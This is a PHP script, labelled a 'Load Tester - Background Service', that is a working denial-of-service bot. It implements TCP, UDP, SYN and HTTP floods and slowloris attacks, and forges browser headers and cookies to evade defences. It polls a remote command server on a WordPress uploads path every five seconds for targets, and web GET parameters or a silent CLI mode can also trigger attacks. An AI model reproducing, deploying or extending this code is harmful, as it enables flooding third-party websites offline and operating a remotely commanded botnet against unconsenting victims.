<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('max_execution_time', 0);
ini_set('memory_limit', '-1');
set_time_limit(0);
ignore_user_abort(true);

// Check if running in CLI mode
define('CLI_MODE', php_sapi_name() === 'cli');

class AttackMethods {
    const FLOOD = 'FLOOD';
    const SLOW = 'SLOW';
    const RUDY = 'RUDY';
    const HULK = 'HULK';
    const GEYE = 'GEYE';
    const MIXED = 'MIXED';
    const SSL = 'SSL';
    const HTTP2 = 'HTTP2';
    const TCP = 'TCP';
    const UDP = 'UDP';
    const SYN = 'SYN';
    const ACK = 'ACK';
    const FIN = 'FIN';
    const RST = 'RST';
    const XMAS = 'XMAS';
}

class OutputManager {
    public static function write($message, $newline = true) {
        if (CLI_MODE) {
            if (defined('SILENT_MODE') && SILENT_MODE) {
                return;
            }
            echo $message . ($newline ? PHP_EOL : '');
        } else {
            echo $message . ($newline ? '<br>' : '');
            flush();
        }
    }
    
    public static function writeError($message) {
        self::write("[ERROR] $message");
    }
    
    public static function writeInfo($message) {
        self::write("[INFO] $message");
    }
    
    public static function writeSuccess($message) {
        self::write("[SUCCESS] $message");
    }
}

class UserAgentGenerator {
    private static $platforms = [
        ['Windows NT 10.0; Win64; x64', 'Windows'],
        ['Windows NT 6.3; Win64; x64', 'Windows'],
        ['Macintosh; Intel Mac OS X 10_15_7', 'Mac'],
        ['X11; Linux x86_64', 'Linux']
    ];
    
    public static function generate() {
        $platform = self::$platforms[array_rand(self::$platforms)];
        $browser_type = mt_rand(0, 100);
        if ($browser_type < 70) return self::generateChrome($platform);
        elseif ($browser_type < 95) return self::generateFirefox($platform);
        else return self::generateSafari($platform);
    }
    
    private static function generateChrome($platform) {
        $chrome_versions = ['119.0.6045.123', '118.0.5993.117', '117.0.5938.132'];
        $chrome_ver = $chrome_versions[array_rand($chrome_versions)];
        return "Mozilla/5.0 ({$platform[0]}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{$chrome_ver} Safari/537.36";
    }
    
    private static function generateFirefox($platform) {
        $ff_versions = ['119.0', '118.0', '117.0'];
        $ff_ver = $ff_versions[array_rand($ff_versions)];
        return "Mozilla/5.0 ({$platform[0]}; rv:{$ff_ver}.0) Gecko/20100101 Firefox/{$ff_ver}.0";
    }
    
    private static function generateSafari($platform) {
        $safari_versions = ['17.0', '16.6', '16.1'];
        $safari_ver = $safari_versions[array_rand($safari_versions)];
        return "Mozilla/5.0 ({$platform[0]}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{$safari_ver} Safari/605.1.15";
    }
}

class SessionManager {
    private static $sessions = [];
    private static $session_counter = 0;
    
    public static function createSession() {
        $session_id = 'sess_' . self::$session_counter++ . '_' . bin2hex(random_bytes(12));
        self::$sessions[$session_id] = [
            'cookies' => self::generateSessionCookies($session_id),
            'created' => microtime(true),
            'requests' => 0,
            'last_activity' => time()
        ];
        return $session_id;
    }
    
    private static function generateSessionCookies($session_id) {
        return [
            'PHPSESSID' => $session_id,
            'session_token' => bin2hex(random_bytes(24)),
            'user_id' => mt_rand(10000000, 99999999),
            'csrf_token' => bin2hex(random_bytes(16)),
            'visit_id' => 'vid_' . time() . '_' . mt_rand(1000, 9999)
        ];
    }
    
    public static function getCookies($session_id) {
        if (!isset(self::$sessions[$session_id])) $session_id = self::createSession();
        self::$sessions[$session_id]['requests']++;
        self::$sessions[$session_id]['last_activity'] = time();
        $cookies = self::$sessions[$session_id]['cookies'];
        $cookies['request_count'] = self::$sessions[$session_id]['requests'];
        $cookies['session_age'] = time() - strtotime('today');
        $cookie_string = '';
        foreach ($cookies as $name => $value) $cookie_string .= "$name=$value; ";
        return rtrim($cookie_string, '; ');
    }
    
    public static function getActiveSessionsCount() {
        return count(self::$sessions);
    }
}

class RequestManager {
    private static $request_counter = 0;
    
    public static function generateHeaders($session_id = null) {
        $user_agent = UserAgentGenerator::generate();
        $headers = [
            "User-Agent" => $user_agent,
            "Accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language" => "en-US,en;q=0.9",
            "Accept-Encoding" => "gzip, deflate, br",
            "Connection" => "keep-alive",
            "Upgrade-Insecure-Requests" => "1",
            "Cache-Control" => "max-age=0",
            "Sec-Fetch-Dest" => "document",
            "Sec-Fetch-Mode" => "navigate",
            "Sec-Fetch-Site" => "none"
        ];
        
        if (strpos($user_agent, 'Chrome') !== false) {
            $chrome_version = explode('Chrome/', $user_agent)[1];
            $chrome_version = explode('.', $chrome_version)[0];
            $headers["Sec-Ch-Ua"] = '"Google Chrome";v="' . $chrome_version . '", "Chromium";v="' . $chrome_version . '", "Not=A?Brand";v="24"';
            $headers["Sec-Ch-Ua-Mobile"] = "?0";
        }
        
        if ($session_id) {
            $cookies = SessionManager::getCookies($session_id);
            if ($cookies) $headers["Cookie"] = $cookies;
        }
        
        if (mt_rand(0, 100) > 30) {
            $referers = ["https://www.google.com/", "https://www.bing.com/", "https://www.facebook.com/", ""];
            $headers["Referer"] = $referers[array_rand($referers)];
        }
        
        $keys = array_keys($headers);
        shuffle($keys);
        $final = [];
        foreach ($keys as $k) if (!empty($headers[$k])) $final[] = "$k: " . $headers[$k];
        return $final;
    }
    
    public static function generateRequestData() {
        self::$request_counter++;
        return [
            '_' => time() . mt_rand(100, 999),
            't' => microtime(true),
            'r' => self::$request_counter,
            'v' => mt_rand(1, 1000000)
        ];
    }
}

function setup_curl_handle($url, $session_id = null, $use_post = false) {
    $ch = curl_init();
    if ($use_post) {
        $post_data = RequestManager::generateRequestData();
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post_data));
    } else {
        $query_data = RequestManager::generateRequestData();
        $url_with_query = $url . (strpos($url, '?') !== false ? '&' : '?') . http_build_query($query_data);
        curl_setopt($ch, CURLOPT_URL, $url_with_query);
    }
    
    $headers = RequestManager::generateHeaders($session_id);
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_TIMEOUT => 20,
        CURLOPT_CONNECTTIMEOUT => 3,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_TCP_KEEPALIVE => 1,
        CURLOPT_TCP_NODELAY => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_2_0,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 2,
        CURLOPT_ENCODING => "gzip, deflate",
        CURLOPT_HEADER => false
    ]);
    
    if (mt_rand(0, 100) > 80) curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "HEAD");
    return $ch;
}

function tcp_flood_attack($host, $port, $threads, $duration) {
    $start_time = microtime(true);
    $end_time = $start_time + $duration;
    $total_packets = 0;
    
    OutputManager::write("[TCP] Starting flood on $host:$port with $threads threads");
    
    for ($i = 0; $i < $threads; $i++) {
        $socket = @fsockopen($host, $port, $errno, $errstr, 2);
        if ($socket) {
            fwrite($socket, str_repeat("X", 1024));
            fclose($socket);
            $total_packets++;
        }
    }
    
    OutputManager::write("[TCP] Initialized");
    
    while (microtime(true) < $end_time) {
        for ($i = 0; $i < 100; $i++) {
            $socket = @fsockopen($host, $port, $errno, $errstr, 1);
            if ($socket) {
                fwrite($socket, str_repeat("X", 2048));
                fclose($socket);
                $total_packets++;
            }
        }
        
        if (rand(0, 100) > 90) {
            OutputManager::write("[TCP] Packets sent: " . number_format($total_packets));
        }
        
        usleep(10000);
    }
    
    return $total_packets;
}

function udp_flood_attack($host, $port, $threads, $duration) {
    $start_time = microtime(true);
    $end_time = $start_time + $duration;
    $total_packets = 0;
    
    OutputManager::write("[UDP] Starting flood on $host:$port with $threads threads");
    
    for ($i = 0; $i < $threads; $i++) {
        $socket = @fsockopen("udp://$host", $port, $errno, $errstr, 2);
        if ($socket) {
            fwrite($socket, str_repeat("U", 512));
            fclose($socket);
            $total_packets++;
        }
    }
    
    OutputManager::write("[UDP] Initialized");
    
    while (microtime(true) < $end_time) {
        for ($i = 0; $i < 150; $i++) {
            $socket = @fsockopen("udp://$host", $port, $errno, $errstr, 1);
            if ($socket) {
                fwrite($socket, str_repeat("U", 1024));
                fclose($socket);
                $total_packets++;
            }
        }
        
        if (rand(0, 100) > 90) {
            OutputManager::write("[UDP] Packets sent: " . number_format($total_packets));
        }
        
        usleep(5000);
    }
    
    return $total_packets;
}

function syn_flood_attack($host, $port, $threads, $duration) {
    $start_time = microtime(true);
    $end_time = $start_time + $duration;
    $total_packets = 0;
    
    OutputManager::write("[SYN] Starting flood on $host:$port with $threads threads");
    
    while (microtime(true) < $end_time) {
        for ($i = 0; $i < $threads; $i++) {
            $socket = @fsockopen($host, $port, $errno, $errstr, 0.5);
            if ($socket) {
                fclose($socket);
                $total_packets++;
            }
        }
        
        if (rand(0, 100) > 95) {
            OutputManager::write("[SYN] Packets sent: " . number_format($total_packets));
        }
        
        usleep(50000);
    }
    
    return $total_packets;
}

function slowloris_attack($host, $port, $threads, $duration) {
    $start_time = microtime(true);
    $end_time = $start_time + $duration;
    $connections = [];
    
    OutputManager::write("[SLOW] Starting attack on $host:$port with $threads connections");
    
    for ($i = 0; $i < $threads; $i++) {
        $socket = @fsockopen($host, $port, $errno, $errstr, 2);
        if ($socket) {
            $partial_request = "GET /?" . uniqid() . " HTTP/1.1\r\n";
            $partial_request .= "Host: " . parse_url($host, PHP_URL_HOST) . "\r\n";
            $partial_request .= "User-Agent: " . UserAgentGenerator::generate() . "\r\n";
            fwrite($socket, $partial_request);
            $connections[] = $socket;
        }
    }
    
    OutputManager::write("[SLOW] Initialized with " . count($connections) . " connections");
    
    while (microtime(true) < $end_time) {
        foreach ($connections as $socket) {
            if (rand(0, 100) > 70) {
                fwrite($socket, "X-" . uniqid() . ": " . str_repeat("A", rand(10, 100)) . "\r\n");
            }
        }
        
        if (rand(0, 100) > 95) {
            OutputManager::write("[SLOW] Active connections: " . count($connections));
        }
        
        sleep(5);
    }
    
    foreach ($connections as $socket) {
        @fclose($socket);
    }
    
    return count($connections);
}

function execute_attack($target, $duration, $threads, $method, $mode = 'NON', $port = 80) {
    if (ob_get_level()) ob_end_clean();
    
    OutputManager::write("[ATTACK] Starting: $method on $target for {$duration}s with $threads threads");
    
    $start_time = microtime(true);
    
    $layer4_methods = [AttackMethods::TCP, AttackMethods::UDP, AttackMethods::SYN, 
                      AttackMethods::ACK, AttackMethods::FIN, AttackMethods::RST, AttackMethods::XMAS];
    
    if (in_array($method, $layer4_methods)) {
        $host = parse_url($target, PHP_URL_HOST) ?: $target;
        
        switch($method) {
            case AttackMethods::TCP:
                $result = tcp_flood_attack($host, $port, $threads, $duration);
                OutputManager::write("[TCP] Completed: " . number_format($result) . " packets");
                break;
            case AttackMethods::UDP:
                $result = udp_flood_attack($host, $port, $threads, $duration);
                OutputManager::write("[UDP] Completed: " . number_format($result) . " packets");
                break;
            case AttackMethods::SYN:
                $result = syn_flood_attack($host, $port, $threads, $duration);
                OutputManager::write("[SYN] Completed: " . number_format($result) . " packets");
                break;
            default:
                $result = tcp_flood_attack($host, $port, $threads, $duration);
                OutputManager::write("[L4] Completed: " . number_format($result) . " packets");
        }
    } else {
        execute_http_attack($target, $duration, $threads, $method, $mode);
    }
    
    $elapsed = microtime(true) - $start_time;
    OutputManager::write("[ATTACK] Finished in " . round($elapsed, 2) . "s");
}

function execute_http_attack($target_url, $duration, $threads, $method, $mode = 'NON') {
    $multi_handles = [];
    $session_pools = [];
    $start_time = microtime(true);
    $end_time = $start_time + $duration;
    $total_requests = 0;
    $failed_requests = 0;
    
    $num_pools = min(3, ceil($threads / 4000));
    $sockets_per_pool = floor($threads / $num_pools);
    
    for ($i = 0; $i < $num_pools; $i++) {
        $multi_handles[$i] = curl_multi_init();
        curl_multi_setopt($multi_handles[$i], CURLMOPT_PIPELINING, 3);
        curl_multi_setopt($multi_handles[$i], CURLMOPT_MAX_HOST_CONNECTIONS, 1000);
        curl_multi_setopt($multi_handles[$i], CURLMOPT_MAX_TOTAL_CONNECTIONS, 4000);
        
        $session_pools[$i] = [];
        for ($j = 0; $j < $sockets_per_pool; $j++) {
            $session_id = SessionManager::createSession();
            $session_pools[$i][$j] = $session_id;
            
            $use_post = false;
            if ($method == AttackMethods::RUDY || $mode == 'POST' || 
                ($mode == 'MIX' && mt_rand(0, 100) > 60)) {
                $use_post = true;
            }
            
            $ch = setup_curl_handle($target_url, $session_id, $use_post);
            curl_multi_add_handle($multi_handles[$i], $ch);
        }
    }
    
    OutputManager::write("[HTTP] Initialized $num_pools pools");
    
    $last_stats_time = $start_time;
    $peak_rps = 0;
    
    while (microtime(true) < $end_time) {
        $current_time = microtime(true);
        
        for ($i = 0; $i < $num_pools; $i++) {
            $active = null;
            curl_multi_exec($multi_handles[$i], $active);
            
            while ($info = curl_multi_info_read($multi_handles[$i])) {
                $ch = $info['handle'];
                $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                if ($http_code != 200 && $http_code != 404 && $http_code != 403) $failed_requests++;
                curl_multi_remove_handle($multi_handles[$i], $ch);
                curl_close($ch);
                $total_requests++;
                
                $pool_index = mt_rand(0, $num_pools - 1);
                $session_index = array_rand($session_pools[$pool_index]);
                $session_id = $session_pools[$pool_index][$session_index];
                
                $use_post = false;
                if ($method == AttackMethods::RUDY || $mode == 'POST' || 
                    ($mode == 'MIX' && mt_rand(0, 100) > 60)) {
                    $use_post = true;
                }
                
                $new_ch = setup_curl_handle($target_url, $session_id, $use_post);
                curl_multi_add_handle($multi_handles[$pool_index], $new_ch);
            }
            curl_multi_select($multi_handles[$i], 0.001);
        }
        
        if ($current_time - $last_stats_time >= 5) {
            $elapsed = $current_time - $start_time;
            $current_rps = round($total_requests / $elapsed);
            $peak_rps = max($peak_rps, $current_rps);
            $active_sessions = SessionManager::getActiveSessionsCount();
            $mem_usage = round(memory_get_usage(true) / 1024 / 1024, 2);
            
            OutputManager::write("[STATS] RPS: $current_rps | Total: " . number_format($total_requests) . 
                 " | Failed: " . number_format($failed_requests) . " | Mem: {$mem_usage}MB");
            $last_stats_time = $current_time;
        }
        
        usleep(1000);
        
        if ($method == AttackMethods::GEYE && mt_rand(0, 100) > 95) {
            for ($burst = 0; $burst < 50; $burst++) {
                $session_id = SessionManager::createSession();
                $ch = setup_curl_handle($target_url, $session_id, true);
                curl_multi_add_handle($multi_handles[mt_rand(0, $num_pools - 1)], $ch);
                $total_requests++;
            }
            OutputManager::write("[GEYE] Burst: 50 POST requests added");
        }
    }
    
    for ($i = 0; $i < $num_pools; $i++) {
        $active = null;
        curl_multi_exec($multi_handles[$i], $active);
        while ($info = curl_multi_info_read($multi_handles[$i])) {
            curl_multi_remove_handle($multi_handles[$i], $info['handle']);
            curl_close($info['handle']);
        }
        curl_multi_close($multi_handles[$i]);
    }
    
    $elapsed = microtime(true) - $start_time;
    $avg_rps = round($total_requests / $elapsed);
    
    OutputManager::write("[HTTP] Completed: Avg RPS: $avg_rps | Total: " . number_format($total_requests) . 
         " | Failed: " . number_format($failed_requests));
}

function check_api_for_commands() {
    $api_url = "https://tuvanthienha.vn/wp-content/uploads/2024/03/api.php";
    
    try {
        $ch = curl_init($api_url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_SSL_VERIFYPEER => false
        ]);
        
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        if ($http_code == 200 && !empty($response)) {
            if (strpos($response, '<?xml') !== false) {
                $xml = @simplexml_load_string($response);
                if ($xml && isset($xml->url) && isset($xml->time)) {
                    $target = (string)$xml->url;
                    $time = (int)$xml->time;
                    $wait = (int)$xml->wait;
                    $method = isset($xml->method) ? (string)$xml->method : 'FLOOD';
                    $conc = isset($xml->conc) ? (int)$xml->conc : 1000;
                    $mode = isset($xml->mode) ? (string)$xml->mode : 'NON';
                    $port = isset($xml->port) ? (int)$xml->port : 80;
                    
                    OutputManager::write("[API] Command received: $method on $target for {$time}s");
                    OutputManager::write("[API] Threads: $conc | Mode: $mode");
                    
                    if ($wait > 0) {
                        OutputManager::write("[API] Waiting $wait seconds...");
                        sleep($wait);
                    }
                    
                    execute_attack($target, $time, $conc, $method, $mode, $port);
                    return true;
                }
            }
        }
        OutputManager::write("[API] No commands found");
        return false;
    } catch (Exception $e) {
        OutputManager::write("[API] Error: " . $e->getMessage());
        return false;
    }
}

// Handle CLI arguments
if (CLI_MODE) {
    $options = getopt("s:u:t:c:m:p:o:q", ["silent", "url:", "time:", "conc:", "method:", "port:", "mode:", "query"]);
    
    // Check for silent mode
    if (isset($options['s']) || isset($options['silent'])) {
        define('SILENT_MODE', true);
    }
    
    // Check for direct attack parameters
    if (isset($options['u']) || isset($options['url'])) {
        $url = isset($options['u']) ? $options['u'] : $options['url'];
        $time = isset($options['t']) ? intval($options['t']) : (isset($options['time']) ? intval($options['time']) : 30);
        $conc = isset($options['c']) ? intval($options['c']) : (isset($options['conc']) ? intval($options['conc']) : 1000);
        $method = isset($options['m']) ? $options['m'] : (isset($options['method']) ? $options['method'] : 'FLOOD');
        $port = isset($options['p']) ? intval($options['p']) : (isset($options['port']) ? intval($options['port']) : 80);
        $mode = isset($options['o']) ? $options['o'] : (isset($options['mode']) ? $options['mode'] : 'NON');
        
        if (!empty($url) && $conc > 0 && $time > 0) {
            execute_attack($url, $time, $conc, $method, $mode, $port);
            exit(0);
        } else {
            if (!defined('SILENT_MODE') || !SILENT_MODE) {
                OutputManager::write("Usage: php " . basename(__FILE__) . " -u URL -t TIME -c CONCURRENT -m METHOD [-p PORT] [-o MODE] [-s]");
                OutputManager::write("Example: php " . basename(__FILE__) . " -u http://example.com -t 60 -c 2000 -m FLOOD -o NON -p 80");
                OutputManager::write("Silent mode: php " . basename(__FILE__) . " -u http://example.com -t 60 -c 1000 -m TCP -s");
            }
            exit(1);
        }
    }
    
    // Check for API query mode
    if (isset($options['q']) || isset($options['query'])) {
        if (!defined('SILENT_MODE') || !SILENT_MODE) {
            OutputManager::write("[CLI] Checking API for commands...");
        }
        check_api_for_commands();
        exit(0);
    }
    
    // Default CLI behavior: start API polling
    if (!defined('SILENT_MODE') || !SILENT_MODE) {
        OutputManager::write("[CLI] Load tester started in CLI mode");
        OutputManager::write("[CLI] Polling API every 5 seconds...");
        OutputManager::write("[CLI] Press Ctrl+C to stop");
    }
    
    // Continuous API polling
    while (true) {
        check_api_for_commands();
        sleep(5);
    }
}

// Web mode execution
if (isset($_GET['check'])) {
    ob_start();
    check_api_for_commands();
    $output = ob_get_clean();
    echo $output;
    exit;
}

if (isset($_GET['type'])) {
    ob_start();
    $type = $_GET['type'] ?? '';
    $url = $_GET['url'] ?? '';
    $met = $_GET['met'] ?? '';
    $conc = intval($_GET['conc'] ?? 1000);
    $time = intval($_GET['time'] ?? 30);
    $mode = $_GET['mode'] ?? 'NON';
    $port = intval($_GET['port'] ?? 80);
    
    if (!empty($url) && !empty($met) && $conc > 0 && $time > 0) {
        execute_attack($url, $time, $conc, $met, $mode, $port);
    } else {
        OutputManager::write("[ERROR] Invalid parameters");
    }
    
    $output = ob_get_clean();
    echo $output;
    exit;
}

// Main web page
?>
<!DOCTYPE html>
<html>
<head>
    <title>Load Tester - Background Service</title>
    <style>
        body { 
            background: black; 
            color: lime; 
            font-family: monospace; 
            margin: 0; 
            padding: 20px; 
            font-size: 14px;
        }
        #output { 
            white-space: pre-wrap;
            word-wrap: break-word;
            overflow-y: auto;
            height: calc(100vh - 40px);
        }
        #status {
            position: fixed;
            top: 10px;
            right: 10px;
            background: #111;
            padding: 5px 10px;
            border: 1px solid lime;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div id="status">Status: <span id="statusText">ACTIVE</span> | Next check: <span id="countdown">5</span>s</div>
    <div id="output">[SYSTEM] Load tester started. Checking for commands every 5 seconds...<br></div>

    <script>
        let output = document.getElementById('output');
        let statusText = document.getElementById('statusText');
        let countdown = document.getElementById('countdown');
        let checkInterval = 5000; // 5 seconds
        let countdownValue = 5;
        
        function updateOutput(message) {
            output.innerHTML += message + '\n';
            output.scrollTop = output.scrollHeight;
        }
        
        function checkForCommands() {
            statusText.textContent = 'CHECKING';
            statusText.style.color = '#ff0';
            
            fetch('?check=1')
                .then(response => response.text())
                .then(data => {
                    if (data.trim()) {
                        updateOutput(data);
                    }
                    statusText.textContent = 'ACTIVE';
                    statusText.style.color = '#0f0';
                    countdownValue = 5;
                })
                .catch(error => {
                    updateOutput('[ERROR] Failed to check API: ' + error.message);
                    statusText.textContent = 'ERROR';
                    statusText.style.color = '#f00';
                    countdownValue = 5;
                });
        }
        
        // Start checking immediately
        checkForCommands();
        
        // Set up interval for checking
        setInterval(() => {
            checkForCommands();
        }, checkInterval);
        
        // Update countdown
        setInterval(() => {
            countdownValue--;
            if (countdownValue < 0) countdownValue = 5;
            countdown.textContent = countdownValue;
        }, 1000);
        
        // Auto-scroll
        setInterval(() => {
            output.scrollTop = output.scrollHeight;
        }, 100);
    </script>
</body>
</html>
